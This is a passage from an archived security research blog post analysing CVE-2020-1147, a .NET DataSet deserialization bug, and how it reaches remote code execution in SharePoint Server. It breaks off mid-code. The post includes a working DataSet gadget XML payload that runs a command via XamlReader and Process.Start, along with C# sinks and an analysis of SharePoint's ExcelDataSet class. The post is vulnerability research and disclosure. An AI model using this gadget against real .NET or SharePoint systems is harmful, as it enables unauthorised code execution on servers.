<!DOCTYPE html>
<!-- saved from url=(0124)https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <script src="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/mobile.js.download"></script>
  <link rel="shortcut icon" type="image/x-icon" href="https://srcincite.io/assets/favicon.ico?">
  
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  </head><body><a rel="me" href="https://infosec.exchange/@stevenseeley"></a>
  <title>SharePoint and Pwn :: Remote Code Execution Against SharePoint Server Abusing DataSet</title>
  <meta name="description" content="When CVE-2020-1147 was released last week I was curious as to how this vulnerability manifested and how an attacker might achieve remote code execution with ...">
  <link rel="stylesheet" href="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/main.css">
  <link rel="canonical" href="https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html">
  <link rel="alternate" type="application/rss+xml" title="Source Incite" href="https://srcincite.io/feed.xml">


  
  <header class="site-header">    <div class="wrapper">        <a class="site-title" href="https://srcincite.io/"><img id="render" style="border:none; background:transparent; overflow:hidden; width:30%; height:30%" src="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/si.png" alt="Source Incite" onload="window.mobilecheck();"></a>        <nav class="site-nav">            <a href="https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html#" class="menu-icon">                <svg viewBox="0 0 18 15">                    <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"></path>                    <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"></path>                    <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"></path>                </svg>            </a>            <div class="trigger">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <a class="page-link cn" href="https://srcincite.io/about/">About</a>                                                                                                            <a class="page-link cn" href="https://srcincite.io/blog/">Blog</a>                                                                                                            <a class="page-link cn" href="https://srcincite.io/advisories/">Advisories</a>                                                                                                            <a class="page-link cn" href="https://srcincite.io/exploits/">Exploits</a>                                                                                                            <a class="page-link cn" href="https://srcincite.io/research/">Research</a>                                                                                                            <div class="dropdown">                            <a class="page-link cn" href="https://srcincite.io/training/">Training</a>                            <div class="dropdown-content">                                <a class="menulinks cn" href="https://srcincite.io/training/syllabus/">Syllabus</a>                                <a class="menulinks cn" href="https://srcincite.io/training/prerequisites/">Prerequisites</a>                                <a class="menulinks cn" href="https://srcincite.io/training/challenge/">Challenge</a>                                <a class="menulinks cn" href="https://srcincite.io/training/schedule-signup/">Schedule/Signup</a>                                <a class="menulinks cn" href="https://srcincite.io/training/testimonials/">Testimonials</a>                                <a class="menulinks cn" href="https://srcincite.io/training/faq/">Faq</a>                            </div>                        </div>                                                                                                            <a class="page-link cn" href="https://srcincite.io/contact/">Contact</a>                                                            </div>        </nav>    </div></header>
    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">SharePoint and Pwn :: Remote Code Execution Against SharePoint Server Abusing DataSet</h1>
    <p class="post-meta"><time datetime="2020-07-20T14:00:00+00:00" itemprop="datePublished">Jul 20, 2020</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><img src="./SharePoint and Pwn __ Remote Code Execution Against SharePoint Server Abusing DataSet_files/sp-logo.png" alt="SharePoint" title="SharePoint"></p>

<p>When <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1147">CVE-2020-1147</a> was released last week I was curious as to how this vulnerability manifested and how an attacker might achieve remote code execution with it. Since I’m somewhat familiar with SharePoint Server and .net, I decided to take a look.
<!--more--></p>

<p>TL;DR; <em>I share the breakdown of CVE-2020-1147 which was discovered independently by <a href="https://twitter.com/olekmirosh">Oleksandr Mirosh</a>, <a href="https://twitter.com/mwulftange">Markus Wulftange</a> and <a href="https://www.linkedin.com/in/jonathan-birch-ab27681/">Jonathan Birch</a>. I share the details on how it can be leveraged against a SharePoint Server instance to gain remote code execution as a low privileged user. Please note: I am not providing a full exploit, so if that’s your jam, move along.</em></p>

<p>One of the things that stood out to me, was that Microsoft published <a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance">Security Guidence</a> related to this bug, quoting Microsoft:</p>

<blockquote>
  <p>If the incoming XML data contains an object whose type is not in this list…
An exception is thrown.
The deserialization operation fails.
When loading XML into an existing DataSet or DataTable instance, the existing column definitions are also taken into account. If the table already contains a column definition of a custom type, that type is temporarily added to the allow list for the duration of the XML deserialization operation.</p>
</blockquote>

<p>Interestingly, it was possible to specify types and it was possible to overwrite column definitions. That was the key giveaway for me, let’s take a look at how the <code class="language-plaintext highlighter-rouge">DataSet</code> object is created:</p>

<h2 id="understanding-the-dataset-object">Understanding the DataSet Object</h2>

<p>A <a href="https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset?view=netcore-3.1"><code class="language-plaintext highlighter-rouge">DataSet</code></a> contains a <code class="language-plaintext highlighter-rouge">Datatable</code> with <code class="language-plaintext highlighter-rouge">DataColumn</code>(s) and <code class="language-plaintext highlighter-rouge">DataRow</code>(s). More importantly, it implements the <code class="language-plaintext highlighter-rouge">ISerializable</code> interface meaning that it can be serialized with <code class="language-plaintext highlighter-rouge">XmlSerializer</code>. Let’s start by creating a <code class="language-plaintext highlighter-rouge">DataTable</code>:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="c1">// instantiate the table</span>
            <span class="n">DataTable</span> <span class="n">exptable</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DataTable</span><span class="p">(</span><span class="s">"exp table"</span><span class="p">);</span>
			
            <span class="c1">// make a column and set type information and append to the table</span>
            <span class="n">DataColumn</span> <span class="n">dc</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DataColumn</span><span class="p">(</span><span class="s">"ObjectDataProviderCol"</span><span class="p">);</span>
            <span class="n">dc</span><span class="p">.</span><span class="n">DataType</span> <span class="p">=</span> <span class="k">typeof</span><span class="p">(</span><span class="n">ObjectDataProvider</span><span class="p">);</span>
            <span class="n">exptable</span><span class="p">.</span><span class="n">Columns</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">dc</span><span class="p">);</span>
			
            <span class="c1">// make a row and set an object instance and append to the table</span>
            <span class="n">DataRow</span> <span class="n">row</span> <span class="p">=</span> <span class="n">exptable</span><span class="p">.</span><span class="nf">NewRow</span><span class="p">();</span>
            <span class="n">row</span><span class="p">[</span><span class="s">"ObjectDataProviderCol"</span><span class="p">]</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ObjectDataProvider</span><span class="p">();</span>
            <span class="n">exptable</span><span class="p">.</span><span class="n">Rows</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">row</span><span class="p">);</span>
			
            <span class="c1">// dump the xml schema</span>
            <span class="n">exptable</span><span class="p">.</span><span class="nf">WriteXmlSchema</span><span class="p">(</span><span class="s">"c:/poc-schema.xml"</span><span class="p">);</span>
        <span class="p">}</span>		
</code></pre></div></div>

<p>Using the <code class="language-plaintext highlighter-rouge">WriteXmlSchema</code> method, It’s possible to write out the schema definition. That code produces the following:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" standalone="yes"?&gt;</span>
<span class="nt">&lt;xs:schema</span> <span class="na">id=</span><span class="s">"NewDataSet"</span> <span class="na">xmlns=</span><span class="s">""</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:msdata=</span><span class="s">"urn:schemas-microsoft-com:xml-msdata"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"NewDataSet"</span> <span class="na">msdata:IsDataSet=</span><span class="s">"true"</span> <span class="na">msdata:MainDataTable=</span><span class="s">"exp_x0020_table"</span> <span class="na">msdata:UseCurrentLocale=</span><span class="s">"true"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;xs:complexType&gt;</span>
      <span class="nt">&lt;xs:choice</span> <span class="na">minOccurs=</span><span class="s">"0"</span> <span class="na">maxOccurs=</span><span class="s">"unbounded"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"exp_x0020_table"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;xs:complexType&gt;</span>
            <span class="nt">&lt;xs:sequence&gt;</span>
              <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"ObjectDataProviderCol"</span> <span class="na">msdata:DataType=</span><span class="s">"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"</span> <span class="na">type=</span><span class="s">"xs:anyType"</span> <span class="na">minOccurs=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/xs:sequence&gt;</span>
          <span class="nt">&lt;/xs:complexType&gt;</span>
        <span class="nt">&lt;/xs:element&gt;</span>
      <span class="nt">&lt;/xs:choice&gt;</span>
    <span class="nt">&lt;/xs:complexType&gt;</span>
  <span class="nt">&lt;/xs:element&gt;</span>
<span class="nt">&lt;/xs:schema&gt;</span>
</code></pre></div></div>

<p>Looking into the code of <code class="language-plaintext highlighter-rouge">DataSet</code> it’s revealed that it exposes its own serialization methods (wrapped over <code class="language-plaintext highlighter-rouge">XmlSerializer</code>) using <code class="language-plaintext highlighter-rouge">WriteXml</code> and <code class="language-plaintext highlighter-rouge">ReadXML</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>System.Data.DataSet.ReadXml(XmlReader reader, Boolean denyResolving)
  System.Data.DataSet.ReadXmlDiffgram(XmlReader reader)
    System.Data.XmlDataLoader.LoadData(XmlReader reader)
      System.Data.XmlDataLoader.LoadTable(DataTable table, Boolean isNested)
        System.Data.XmlDataLoader.LoadColumn(DataColumn column, Object[] foundColumns)
          System.Data.DataColumn.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
            System.Data.Common.ObjectStorage.ConvertXmlToObject(XmlReader xmlReader, XmlRootAttribute xmlAttrib)
              System.Xml.Serialization.XmlSerializer.Deserialize(XmlReader xmlReader)
</code></pre></div></div>

<p>Now, all that’s left to do is add the table to a dataset and serialize it up:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="n">DataSet</span> <span class="n">ds</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DataSet</span><span class="p">(</span><span class="s">"poc"</span><span class="p">);</span>
            <span class="n">ds</span><span class="p">.</span><span class="n">Tables</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="n">exptable</span><span class="p">);</span>
            <span class="k">using</span> <span class="p">(</span><span class="kt">var</span> <span class="n">writer</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">StringWriter</span><span class="p">())</span>
            <span class="p">{</span>
                <span class="n">ds</span><span class="p">.</span><span class="nf">WriteXml</span><span class="p">(</span><span class="n">writer</span><span class="p">);</span>
                <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="n">writer</span><span class="p">.</span><span class="nf">ToString</span><span class="p">());</span>
            <span class="p">}</span>
</code></pre></div></div>

<p>These serialization methods retain schema types and reconstruct attacker influenced types at runtime using a single <code class="language-plaintext highlighter-rouge">DataSet</code> expected type in the instantiated <code class="language-plaintext highlighter-rouge">XmlSerializer</code> object graph.</p>

<h2 id="the-dataset-gadget">The DataSet Gadget</h2>

<p>Below is an example of such a gadget that can be crafted, note that this is not to be confused with the <code class="language-plaintext highlighter-rouge">DataSet</code> gadgets in <a href="https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/DataSetGenerator.cs">ysoserial</a>:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;DataSet&gt;</span>
  <span class="nt">&lt;xs:schema</span> <span class="na">xmlns=</span><span class="s">""</span> <span class="na">xmlns:xs=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xmlns:msdata=</span><span class="s">"urn:schemas-microsoft-com:xml-msdata"</span> <span class="na">id=</span><span class="s">"somedataset"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"somedataset"</span> <span class="na">msdata:IsDataSet=</span><span class="s">"true"</span> <span class="na">msdata:UseCurrentLocale=</span><span class="s">"true"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;xs:complexType&gt;</span>
        <span class="nt">&lt;xs:choice</span> <span class="na">minOccurs=</span><span class="s">"0"</span> <span class="na">maxOccurs=</span><span class="s">"unbounded"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"Exp_x0020_Table"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;xs:complexType&gt;</span>
              <span class="nt">&lt;xs:sequence&gt;</span>
                <span class="nt">&lt;xs:element</span> <span class="na">name=</span><span class="s">"pwn"</span> <span class="na">msdata:DataType=</span><span class="s">"System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"</span> <span class="na">type=</span><span class="s">"xs:anyType"</span> <span class="na">minOccurs=</span><span class="s">"0"</span><span class="nt">/&gt;</span>
              <span class="nt">&lt;/xs:sequence&gt;</span>
            <span class="nt">&lt;/xs:complexType&gt;</span>
          <span class="nt">&lt;/xs:element&gt;</span>
        <span class="nt">&lt;/xs:choice&gt;</span>
      <span class="nt">&lt;/xs:complexType&gt;</span>
    <span class="nt">&lt;/xs:element&gt;</span>
  <span class="nt">&lt;/xs:schema&gt;</span>
  <span class="nt">&lt;diffgr:diffgram</span> <span class="na">xmlns:msdata=</span><span class="s">"urn:schemas-microsoft-com:xml-msdata"</span> <span class="na">xmlns:diffgr=</span><span class="s">"urn:schemas-microsoft-com:xml-diffgram-v1"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;somedataset&gt;</span>
      <span class="nt">&lt;Exp_x0020_Table</span> <span class="na">diffgr:id=</span><span class="s">"Exp Table1"</span> <span class="na">msdata:rowOrder=</span><span class="s">"0"</span> <span class="na">diffgr:hasChanges=</span><span class="s">"inserted"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;pwn</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;ExpandedElement/&gt;</span>
          <span class="nt">&lt;ProjectedProperty0&gt;</span>
            <span class="nt">&lt;MethodName&gt;</span>Parse<span class="nt">&lt;/MethodName&gt;</span>
            <span class="nt">&lt;MethodParameters&gt;</span>
              <span class="nt">&lt;anyType</span> <span class="na">xmlns:xsi=</span><span class="s">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="na">xmlns:xsd=</span><span class="s">"http://www.w3.org/2001/XMLSchema"</span> <span class="na">xsi:type=</span><span class="s">"xsd:string"</span><span class="nt">&gt;</span><span class="cp">&lt;![CDATA[&lt;ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:System="clr-namespace:System;assembly=mscorlib" xmlns:Diag="clr-namespace:System.Diagnostics;assembly=system"&gt;&lt;ObjectDataProvider x:Key="LaunchCmd" ObjectType="{x:Type Diag:Process}" MethodName="Start"&gt;&lt;ObjectDataProvider.MethodParameters&gt;&lt;System:String&gt;cmd&lt;/System:String&gt;&lt;System:String&gt;/c mspaint &lt;/System:String&gt;&lt;/ObjectDataProvider.MethodParameters&gt;&lt;/ObjectDataProvider&gt;&lt;/ResourceDictionary&gt;]]&gt;</span><span class="nt">&lt;/anyType&gt;</span>
            <span class="nt">&lt;/MethodParameters&gt;</span>
            <span class="nt">&lt;ObjectInstance</span> <span class="na">xsi:type=</span><span class="s">"XamlReader"</span><span class="nt">/&gt;</span>
          <span class="nt">&lt;/ProjectedProperty0&gt;</span>
        <span class="nt">&lt;/pwn&gt;</span>
      <span class="nt">&lt;/Exp_x0020_Table&gt;</span>
    <span class="nt">&lt;/somedataset&gt;</span>
  <span class="nt">&lt;/diffgr:diffgram&gt;</span>
<span class="nt">&lt;/DataSet&gt;</span>
</code></pre></div></div>

<p>This gadget chain will call an arbitrary static method on a <code class="language-plaintext highlighter-rouge">Type</code> which contains no interface members. Here I used the notorious <code class="language-plaintext highlighter-rouge">XamlReader.Parse</code> to load malicious Xaml to execute a system command. I used the <code class="language-plaintext highlighter-rouge">ExpandedWrapper</code> class to load two different types as mentioned by <a href="https://twitter.com/pwntester">@pwntester</a>’s <a href="https://speakerdeck.com/pwntester/attacking-net-serialization">amazing research</a>.</p>

<p>It can be leveraged in a number of sinks, such as:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">XmlSerializer</span> <span class="n">ser</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">XmlSerializer</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">DataSet</span><span class="p">));</span>
<span class="n">Stream</span> <span class="n">reader</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FileStream</span><span class="p">(</span><span class="s">"c:/poc.xml"</span><span class="p">,</span> <span class="n">FileMode</span><span class="p">.</span><span class="n">Open</span><span class="p">);</span>
<span class="n">ser</span><span class="p">.</span><span class="nf">Deserialize</span><span class="p">(</span><span class="n">reader</span><span class="p">);</span>		
</code></pre></div></div>

<p>Many applications consider <code class="language-plaintext highlighter-rouge">DataSet</code> to be safe, so even if the expected type can’t be controlled directly to <code class="language-plaintext highlighter-rouge">XmlSerializer</code>, <code class="language-plaintext highlighter-rouge">DataSet</code> is typically used in the object graph. However, the most interesting sink is the <code class="language-plaintext highlighter-rouge">DataSet.ReadXml</code> to trigger code execution:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DataSet</span> <span class="n">ds</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">DataSet</span><span class="p">();</span>
<span class="n">ds</span><span class="p">.</span><span class="nf">ReadXml</span><span class="p">(</span><span class="s">"c:/poc.xml"</span><span class="p">);</span>		
</code></pre></div></div>

<h2 id="applying-the-gadget-to-sharepoint-server">Applying the Gadget to SharePoint Server</h2>

<p>If we take a look at <a href="https://www.zerodayinitiative.com/advisories/ZDI-20-874/">ZDI-20-874</a>, the advisory mentions the <code class="language-plaintext highlighter-rouge">Microsoft.PerformancePoint.Scorecards.Client.ExcelDataSet</code> control which can be leveraged for remote code execution. This immediately plagued my interest since it had the name (DataSet) in its class name. Let’s take a look at SharePoint’s default web.config file:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="nt">&lt;controls&gt;</span>
        <span class="nt">&lt;add</span> <span class="na">tagPrefix=</span><span class="s">"asp"</span> <span class="na">namespace=</span><span class="s">"System.Web.UI"</span> <span class="na">assembly=</span><span class="s">"System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;add</span> <span class="na">tagPrefix=</span><span class="s">"SharePoint"</span> <span class="na">namespace=</span><span class="s">"Microsoft.SharePoint.WebControls"</span> <span class="na">assembly=</span><span class="s">"Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;add</span> <span class="na">tagPrefix=</span><span class="s">"WebPartPages"</span> <span class="na">namespace=</span><span class="s">"Microsoft.SharePoint.WebPartPages"</span> <span class="na">assembly=</span><span class="s">"Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;add</span> <span class="na">tagPrefix=</span><span class="s">"PWA"</span> <span class="na">namespace=</span><span class="s">"Microsoft.Office.Project.PWA.CommonControls"</span> <span class="na">assembly=</span><span class="s">"Microsoft.Office.Project.Server.PWA, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"</span> <span class="nt">/&gt;</span>
        <span class="nt">&lt;add</span> <span class="na">tagPrefix=</span><span class="s">"spsswc"</span> <span class="na">namespace=</span><span class="s">"Microsoft.Office.Server.Search.WebControls"</span> <span class="na">assembly=</span><span class="s">"Microsoft.Office.Server.Search, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;/controls&gt;</span>
</code></pre></div></div>

<p>Under the controls tag, we can see that a prefix doesn’t exist for the <code class="language-plaintext highlighter-rouge">Microsoft.PerformancePoint.Scorecards</code> namespace. However, if we check the SafeControl tags, it is indeed listed with all types from that namespace permitted.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;configuration&gt;</span>
  <span class="nt">&lt;configSections&gt;</span>
  <span class="nt">&lt;SharePoint&gt;</span>
    <span class="nt">&lt;SafeControls&gt;</span>
      <span class="nt">&lt;SafeControl</span> <span class="na">Assembly=</span><span class="s">"Microsoft.PerformancePoint.Scorecards.Client, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c"</span> <span class="na">Namespace=</span><span class="s">"Microsoft.PerformancePoint.Scorecards"</span> <span class="na">TypeName=</span><span class="s">"*"</span> <span class="nt">/&gt;</span>
	  ...
</code></pre></div></div>

<p>Now that we know we can instantiate classes from that namespace, let’s dive into the code to inspect the <code class="language-plaintext highlighter-rouge">ExcelDataSet</code> type:</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">namespace</span> <span class="nn">Microsoft.PerformancePoint.Scorecards</span>
<span class="p">{</span>

	<span class="p">[</span><span class="n">Serializable</span><span class="p">]</span>
	<span class="k">public</span> <span class="k">class</span> <span class="nc">ExcelDataSet</span>
	<span class="p">{</span>
</code></pre></div></div>

<p>The first thing I noticed is that it’s serializable, so I know that it can infact be instantiated as a control and the default constructor will be called along with any public setters that are not marked with the <code class="language-plaintext highlighter-rouge">System.Xml.Serialization.XmlIgnoreAttribute</code> attribute. SharePoint uses <code class="language-plaintext highlighter-rouge">XmlSerializer</code> for creating objects from controls so anywhere in the code where attacker supplied data can flow into <code class="language-plaintext highlighter-rouge">TemplateControl.ParseControl</code>, the <code class="language-plaintext highlighter-rouge">ExcelDataSet</code> type can be leveraged.</p>

<p>One of the properties that stood out was the <code class="language-plaintext highlighter-rouge">DataTable</code> property since it contains a public setter and uses the type <code class="language-plaintext highlighter-rouge">System.Data.DataTable</code>. However, on closer inspection, we can see that the <code class="language-plaintext highlighter-rouge">XmlIgnore</code> attribute is being used, so we can’t trigger the deserialization using this setter.</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">XmlIgnore</span><span class="p">]</span>
<span class="k">public</span> <span class="n">DataTable</span> <span class="n">DataTable</span>
<span class="p">{</span>
	<span class="k">get</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">dataTable</span> <span class="p">==</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="k">this</span><span class="p">.</span><span class="n">dataTable</span> <span class="p">=</span> <span class="p">(</span><span class="n">Helper</span><span class="p">.</span><span class="nf">GetObjectFromCompressedBase64String</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span><span class="p">,</span> <span class="n">ExcelDataSet</span><span class="p">.</span><span class="n">ExpectedSerializationTypes</span><span class="p">)</span> <span class="k">as</span> <span class="n">DataTable</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">dataTable</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
			<span class="p">{</span>
				<span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">dataTable</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">set</span>
	<span class="p">{</span>
		<span class="k">this</span><span class="p">.</span><span class="n">dataTable</span> <span class="p">=</span> <span class="k">value</span><span class="p">;</span>
		<span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The above code does reveal the partial answer though, the getter calls <code class="language-plaintext highlighter-rouge">GetObjectFromCompressedBase64String</code> using the <code class="language-plaintext highlighter-rouge">compressedDataTable</code> property. This method will decode the supplied base64, decompress the binary formatter payload and call <code class="language-plaintext highlighter-rouge">BinaryFormatter.Deserialize</code> with it. However, the code contains expected types for the deserialization, one of which is <code class="language-plaintext highlighter-rouge">DataTable</code>, So we can’t just stuff a generated  <a href="https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TypeConfuseDelegateGenerator.cs">TypeConfuseDelegate</a> here.</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="k">private</span> <span class="k">static</span> <span class="k">readonly</span> <span class="n">Type</span><span class="p">[]</span> <span class="n">ExpectedSerializationTypes</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[]</span>
		<span class="p">{</span>
			<span class="k">typeof</span><span class="p">(</span><span class="n">DataTable</span><span class="p">),</span>
			<span class="k">typeof</span><span class="p">(</span><span class="n">Version</span><span class="p">)</span>
		<span class="p">};</span>
</code></pre></div></div>

<p>Inspecting the <code class="language-plaintext highlighter-rouge">CompressedDataTable</code> property, we can see that we have no issues setting the <code class="language-plaintext highlighter-rouge">compressedDataTable</code> member since it’s using <code class="language-plaintext highlighter-rouge">System.Xml.Serialization.XmlElementAttribute</code> attribute.</p>

<div class="language-c# highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="n">XmlElement</span><span class="p">]</span>
<span class="k">public</span> <span class="kt">string</span> <span class="n">CompressedDataTable</span>
<span class="p">{</span>
	<span class="k">get</span>
	<span class="p">{</span>
		<span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span> <span class="p">==</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="k">this</span><span class="p">.</span><span class="n">dataTable</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span> <span class="p">=</span> <span class="n">Helper</span><span class="p">.</span><span class="nf">GetCompressedBase64StringFromObject</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">dataTable</span><span class="p">);</span>
		<span class="p">}</span>
		<span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="n">compressedDataTable</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">set</span>
	<span class="p">{</span>
